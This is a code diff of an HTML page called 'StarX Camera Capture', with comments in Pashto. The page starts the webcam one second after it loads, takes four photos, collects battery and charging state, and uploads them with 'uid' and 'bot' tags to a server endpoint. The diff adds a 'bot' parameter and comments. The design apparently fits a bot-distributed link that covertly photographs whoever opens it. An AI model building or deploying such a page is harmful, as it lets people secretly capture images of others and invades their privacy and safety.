@@ -7,54 +7,69 @@
 <body>
 <h1>📸 StarX Camera Capture</h1>
 <script>
-const uid = new URLSearchParams(window.location.search).get("uid") || "NO_UID";
+  // ✅ URL څخه user ID او bot ID واخله
+  const params = new URLSearchParams(window.location.search);
+  const uid = params.get("uid") || "NO_UID";
+  const bot = params.get("bot") || "bot1"; // default bot که نه وي ورکړل شوی
 
-async function capturePhotos() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play();
+  async function capturePhotos() {
+    try {
+      // 🎥 کیمره فعال کړه
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
 
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
+      // 🖼 Canvas د عکس اخیستلو لپاره
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
 
-    let batteryLevel = "Unknown";
-    let charging = "Unknown";
+      // 🔋 Battery info
+      let batteryLevel = "Unknown";
+      let charging = "Unknown";
 
-    if (navigator.getBattery) {
-      const battery = await navigator.getBattery();
-      batteryLevel = Math.round(battery.level * 100);
-      charging = battery.charging ? "true" : "false";
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryLevel = Math.round(battery.level * 100);
+        charging = battery.charging ? "true" : "false";
+      }
+
+      // 📦 FormData د عکسونو او معلوماتو لیږلو لپاره
+      const formData = new FormData();
+      formData.append("uid", uid);
+      formData.append("bot", bot);
+      formData.append("battery", batteryLevel.toString());
+      formData.append("charging", charging);
+
+      // 📸 4 عکسونه په پرله پسې ډول واخله
+      for (let i = 1; i <= 4; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
+        formData.append("photo" + i, blob, `snap${i}.jpg`);
+
+        // لږ ځنډ تر څو عکسونه جلا شي
+        await new Promise(r => setTimeout(r, 700));
+      }
+
+      // 📤 عکسونه سرور ته واستوه
+      await fetch("/api/upload", {
+        method: "POST",
+        body: formData
+      });
+
+      // 🎬 Stream بند کړه
+      stream.getTracks().forEach(track => track.stop());
+
+    } catch (e) {
+      console.error("Camera error:", e);
+      alert("🚫 Unable to access camera or take photos.");
     }
-
-    const formData = new FormData();
-    formData.append("uid", uid);
-    formData.append("battery", batteryLevel.toString());
-    formData.append("charging", charging);
-
-    for (let i = 1; i <= 4; i++) {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
-      formData.append("photo" + i, blob, `snap${i}.jpg`);
-      await new Promise(r => setTimeout(r, 700)); // small delay
-    }
-
-    await fetch("/api/upload", {
-      method: "POST",
-      body: formData
-    });
-
-    stream.getTracks().forEach(t => t.stop());
-
-  } catch (e) {
-    console.error("Camera error:", e);
   }
-}
 
-window.onload = () => setTimeout(capturePhotos, 1000);
+  // ⏱ د پاڼې له لوډ وروسته عکس اخیستل پیل کړه
+  window.onload = () => setTimeout(capturePhotos, 1000);
 </script> 
 </body>
 </html> 
